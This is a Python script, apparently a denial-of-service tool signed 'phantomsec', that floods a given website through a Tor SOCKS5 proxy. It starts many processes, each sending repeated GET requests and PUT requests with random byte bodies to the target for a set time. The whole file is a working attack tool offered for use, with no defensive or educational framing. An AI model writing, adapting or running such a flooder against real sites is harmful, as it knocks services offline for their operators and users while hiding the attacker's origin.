import threading
import socks
import socket
import sys
import time
import os
import signal
import random
import multiprocessing
import warnings
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9150)
socket.socket = socks.socksocket
import requests

if len(sys.argv)<4:
    print(f"\033[91mUsage: {sys.argv[0]} [WEBSITE] [TIME] [PROCESSES (THE HIGHER THE BETTER)]\033[0m")
    sys.exit(1)
    
os.system('clear')
print("\033[91mTOR denial of service by phantomsec, contact me at phantomsec2@xmpp.jp on jabber for help. [can take up to a minute to start]\033[0m")
target = sys.argv[1]
dur = int(sys.argv[2])
thr = int(sys.argv[3]) 
start_time = time.time()
session = requests.session()
session.proxies = {'http':  'socks5h://localhost:9050',
                   'https': 'socks5h://localhost:9050'}

def main2(url):
  counter = 0
  while True:
      try:
        #dont even question it, i know how stupid this looks.
        for i in range(1000000000000):
             b = session.get(url).text
             session.get(url)
             b2 = requests.get(url).content
             random_bytes = random._urandom(1490)
             session.put(target, random_bytes)
             counter += 1
             print(counter)
      except Exception:
         pass

class timeError(Exception):
    """a error raised when to kill the program."""
    pass
    
if __name__ == "__main__":
  os.setpgrp()
  try:
      jobs = []
      count = 0
      for i in range(thr):
          t1 = multiprocessing.Process(target=main2, args=(target,))
          jobs.append(t1)
          t1.start()
          time.sleep(0.1)
      print(f"\033[92m\033[4mflood started for {str(dur)} seconds, with {str(thr)} processes. made by phantomsec\033[4m\033[92m\033[0m")
      while True:
        current_time = time.time()
        elapsed_time = current_time - start_time
        if int(elapsed_time) < dur:
          pass
        else:
          raise timeError
  except timeError:
    print("exitting")
    os.killpg(0, signal.SIGKILL)
    exit()
    
